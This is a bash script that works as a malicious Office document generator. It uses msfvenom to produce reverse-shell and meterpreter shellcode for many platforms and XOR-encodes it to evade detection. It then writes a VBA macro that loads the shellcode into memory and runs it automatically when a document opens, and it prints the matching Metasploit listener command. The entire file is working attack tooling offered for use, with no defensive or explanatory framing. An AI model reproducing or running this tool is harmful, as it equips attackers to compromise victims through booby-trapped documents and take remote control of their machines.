#!/bin/bash

# Default config
KEY=0x41
PAYLOAD=""
PAYLOAD_INDEX=""
VBA_OUTPUT=""
CLIPCMD=""
LHOST=""
LPORT=""
RHOST=""
RAW_OUTPUT_FILE="raw_shellcode.vba"
INTERACTIVE_MODE=false
LOGFILE="debug_output.log"

# Payload definitions
declare -A PAYLOADS=(
    [1]="windows/x64/meterpreter/reverse_https"
    [2]="windows/x64/meterpreter/reverse_http"
    [3]="windows/x64/meterpreter/reverse_tcp"
    [4]="windows/meterpreter/reverse_tcp"
    [5]="windows/meterpreter/bind_tcp"
    [6]="windows/shell/reverse_tcp"
    [7]="windows/shell_bind_tcp"
    [8]="windows/shell_reverse_tcp"
    [9]="windows/x64/shell_reverse_tcp"
    [10]="windows/x64/meterpreter_reverse_tcp"
    [11]="linux/x86/meterpreter/reverse_tcp"
    [12]="linux/x64/meterpreter_reverse_tcp"
    [13]="linux/x64/shell_reverse_tcp"
    [14]="osx/x64/shell_reverse_tcp"
    [15]="php/meterpreter_reverse_tcp"
    [16]="python/meterpreter_reverse_tcp"
    [17]="java/meterpreter_reverse_tcp"
    [18]="android/meterpreter_reverse_tcp"
)

declare -A PAYLOAD_OPTIONS=(
    [1]="LHOST,LPORT"
    [2]="LHOST,LPORT"
    [3]="LHOST,LPORT"
    [4]="LHOST,LPORT"
    [5]="RHOST,LPORT"
    [6]="LHOST,LPORT"
    [7]="RHOST,LPORT"
    [8]="LHOST,LPORT"
    [9]="LHOST,LPORT"
    [10]="LHOST,LPORT"
    [11]="LHOST,LPORT"
    [12]="LHOST,LPORT"
    [13]="LHOST,LPORT"
    [14]="LHOST,LPORT"
    [15]="LHOST,LPORT"
    [16]="LHOST,LPORT"
    [17]="LHOST,LPORT"
    [18]="LHOST,LPORT"
)

declare -A PAYLOAD_TYPE=(
    [1]="meterpreter"
    [2]="meterpreter"
    [3]="meterpreter"
    [4]="meterpreter"
    [5]="meterpreter"
    [6]="shell"
    [7]="shell"
    [8]="shell"
    [9]="shell"
    [10]="meterpreter"
    [11]="meterpreter"
    [12]="meterpreter"
    [13]="shell"
    [14]="shell"
    [15]="meterpreter"
    [16]="meterpreter"
    [17]="meterpreter"
    [18]="meterpreter"
)

# === Functions ===
show_payloads() {
    echo "Available Payloads:"
    for i in $(printf "%s\n" "${!PAYLOADS[@]}" | sort -n); do
        echo "  $i) ${PAYLOADS[$i]}"
    done
}

# === Parse args ===
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -lhost) LHOST="$2"; shift 2 ;;
        -lport) LPORT="$2"; shift 2 ;;
        -rhost) RHOST="$2"; shift 2 ;;
        -p) PAYLOAD_INDEX="$2"; PAYLOAD="${PAYLOADS[$2]}"; shift 2 ;;
        -key) KEY="$2"; shift 2 ;;
        -o) VBA_OUTPUT="$2"; shift 2 ;;
        -raw) RAW_OUTPUT_FILE="$2"; shift 2 ;;
        -i|--interactive) INTERACTIVE_MODE=true; shift ;;
        -h|--help)
            echo "Usage: $0 -p <index> -lhost <IP> -lport <PORT> [-rhost <IP>] [-key <0xNN>] [-o <macro.vba>] [-raw <raw.vba>] [-i]"
            echo ""
            show_payloads
            exit 0 ;;
        *) echo "[-] Unknown option: $1"; exit 1 ;;
    esac
done

# Prompt if not set
if [[ -z "$PAYLOAD" ]]; then
    show_payloads
    read -p "Select payload index: " PAYLOAD_INDEX
    PAYLOAD="${PAYLOADS[$PAYLOAD_INDEX]}"
fi

# Validate
REQUIRED_OPTS="${PAYLOAD_OPTIONS[$PAYLOAD_INDEX]}"
IFS=',' read -ra OPT_ARRAY <<< "$REQUIRED_OPTS"
for opt in "${OPT_ARRAY[@]}"; do
    val=$(eval echo \$$opt)
    if [[ -z "$val" ]]; then
        read -p "Enter value for $opt: " val
        eval "$opt=\"$val\""
    fi
done

# Dependency check
command -v msfvenom >/dev/null || { echo "[-] msfvenom not found."; exit 1; }

# Clipboard
if command -v xclip &>/dev/null; then
    CLIPCMD="xclip -selection clipboard"
elif command -v pbcopy &>/dev/null; then
    CLIPCMD="pbcopy"
elif command -v wl-copy &>/dev/null; then
    CLIPCMD="wl-copy"
else
    CLIPCMD="cat"
fi

echo "[*] Payload: $PAYLOAD"
echo "[*] XOR Key: $KEY"

# === Determine format type ===
case "$PAYLOAD" in
    windows/*meterpreter/*|windows/x64/meterpreter*)  
        OUTPUT_FORMAT="vbapplication"
        ;;
    windows/*shell*|windows/x64/shell*)              
        OUTPUT_FORMAT="vbapplication"
        ;;
    *)  
        OUTPUT_FORMAT="exe"
        ;;
esac

# === Binary-only Payloads ===
if [[ "$OUTPUT_FORMAT" != "vbapplication" ]]; then
    OUTFILE="${PAYLOAD//\//_}.exe"
    VENOM_ARGS=""
    for opt in "${OPT_ARRAY[@]}"; do
        val=$(eval echo \$$opt)
        VENOM_ARGS+="$opt=$val "
    done
    echo "[*] This payload type does not support VBA macros."
    echo "[*] Generating binary payload: $OUTFILE"
    msfvenom -p "$PAYLOAD" $VENOM_ARGS -o "$OUTFILE"
    [[ ! -f "$OUTFILE" ]] && { echo "[-] Payload generation failed."; exit 1; }
    echo "[+] Saved: $OUTFILE"
    echo "[!] VBA and interactive mode skipped for binary payloads."
    exit 0
fi

# === Generate raw VBA shellcode ===
VENOM_ARGS=""
for opt in "${OPT_ARRAY[@]}"; do
    val=$(eval echo \$$opt)
    VENOM_ARGS+="$opt=$val "
done

raw=$(msfvenom -p "$PAYLOAD" $VENOM_ARGS EXITFUNC=thread -f vbapplication 2>/dev/null)
[[ -z "$raw" ]] && { echo "[-] msfvenom failed to generate shellcode."; exit 1; }
echo "$raw" > "$RAW_OUTPUT_FILE"
echo "[*] Raw shellcode saved to $RAW_OUTPUT_FILE"

# === Parse and XOR ===
array=$(sed -n '/Array(/,/)/p' <<< "$raw" | tr -d '\r\n\t ' | sed -e 's/_//g' -e 's/^.*Array(//' -e 's/).*//')
clean_array=$(echo "$array" | tr -d '[:space:]' | sed 's/,,*/,/g' | sed 's/^,//;s/,$//')
IFS=',' read -ra bytes <<< "$clean_array"

echo "[*] Encoding shellcode with XOR key..."
encoded_array=()
for b in "${bytes[@]}"; do
    if [[ "$b" =~ ^[0-9]+$ ]]; then
        encoded_array+=($(( b ^ KEY )))
    fi
done

[[ ${#encoded_array[@]} -ne ${#bytes[@]} ]] && { echo "[-] Encoding length mismatch"; exit 1; }
encoded_csv=$(IFS=,; echo "${encoded_array[*]}")

# === Format VBA key ===
if [[ "$KEY" =~ ^0x ]]; then
    hex=$(printf "%X" "$((KEY))")
    vba_key="&H$hex"
else
    vba_key="$KEY"
fi

# === Generate VBA Output ===
if [[ -n "$VBA_OUTPUT" ]]; then
    echo "[*] Generating VBA macro: $VBA_OUTPUT"
    {
        echo "Private Declare PtrSafe Function CreateThread Lib \"KERNEL32\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr"
        echo "Private Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr"
        echo "Private Declare PtrSafe Function RtlMoveMemory Lib \"KERNEL32\" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr"
        echo ""
        echo "Function MyMacro()"
        echo "    Dim addr As LongPtr"
        echo "    Dim counter As Long"
        echo "    Dim decodedByte As Byte"
        echo "    Dim key As Byte: key = $vba_key"
        echo -n "    sc = Array("
        for ((i = 0; i < ${#encoded_array[@]}; i++)); do
            printf "%s" "${encoded_array[$i]}"
            (( i < ${#encoded_array[@]} - 1 )) && printf ","
            (( (i + 1) % 80 == 0 )) && echo " _" && echo -n "        "
            (( i < ${#encoded_array[@]} - 1 )) && printf " "
        done
        echo ")"
        echo "    addr = VirtualAlloc(0, UBound(sc), &H3000, &H40)"
        echo "    For counter = LBound(sc) To UBound(sc)"
        echo "        decodedByte = sc(counter) Xor key"
        echo "        RtlMoveMemory addr + counter, decodedByte, 1"
        echo "    Next counter"
        echo "    CreateThread 0, 0, addr, 0, 0, 0"
        echo "End Function"
        echo "Sub Document_Open(): MyMacro: End Sub"
        echo "Sub AutoOpen(): MyMacro: End Sub"
    } > "$VBA_OUTPUT"
    echo "[+] VBA macro saved to $VBA_OUTPUT"
fi

# === Listener ===
type="${PAYLOAD_TYPE[$PAYLOAD_INDEX]}"
MSF_COMMAND="msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD $PAYLOAD; "
for opt in "${OPT_ARRAY[@]}"; do
    val=$(eval echo \$$opt)
    MSF_COMMAND+="set $opt $val; "
done
MSF_COMMAND+="set EXITFUNC thread; run\""
echo "[*] Listener: $MSF_COMMAND"

# === Interactive Mode ===
if [[ "$INTERACTIVE_MODE" == true ]]; then
    echo "[*] Entering interactive mode. Type 'q' to quit." | tee -a "$LOGFILE"
    while true; do
        echo -e "\nOptions:"
        echo "1) Copy VBA macro"
        echo "2) Copy raw shellcode"
        echo "3) Copy XOR-encoded bytes"
        echo "4) Copy msfconsole command"
        echo "5) Copy all of the above"
        echo "q) Quit"
        read -rp "> " opt

        case "$opt" in
            1) [[ -f "$VBA_OUTPUT" ]] && cat "$VBA_OUTPUT" | $CLIPCMD && echo "[+] VBA macro copied." | tee -a "$LOGFILE" ;;
            2) [[ -f "$RAW_OUTPUT_FILE" ]] && cat "$RAW_OUTPUT_FILE" | $CLIPCMD && echo "[+] Raw shellcode copied." | tee -a "$LOGFILE" ;;
            3) echo "$encoded_csv" | $CLIPCMD && echo "[+] XOR-encoded copied." | tee -a "$LOGFILE" ;;
            4) echo "$MSF_COMMAND" | $CLIPCMD && echo "[+] msfconsole command copied." | tee -a "$LOGFILE" ;;
            5)
                echo "[*] Copying all combined into clipboard..." | tee -a "$LOGFILE"
                combined=""
                [[ -f "$VBA_OUTPUT" ]] && combined+="===== VBA Macro =====\n$(cat "$VBA_OUTPUT")\n\n"
                [[ -f "$RAW_OUTPUT_FILE" ]] && combined+="===== Raw Shellcode =====\n$(cat "$RAW_OUTPUT_FILE")\n\n"
                combined+="===== XOR-Encoded Bytes =====\n$encoded_csv\n\n"
                combined+="===== MSF Listener Command =====\n$MSF_COMMAND\n"
                echo -e "$combined" | $CLIPCMD
                echo "[+] All content copied." | tee -a "$LOGFILE"
                ;;
            q|Q) echo "[*] Exiting interactive mode." | tee -a "$LOGFILE"; break ;;
            *) echo "[-] Invalid option." | tee -a "$LOGFILE" ;;
        esac
    done
fi
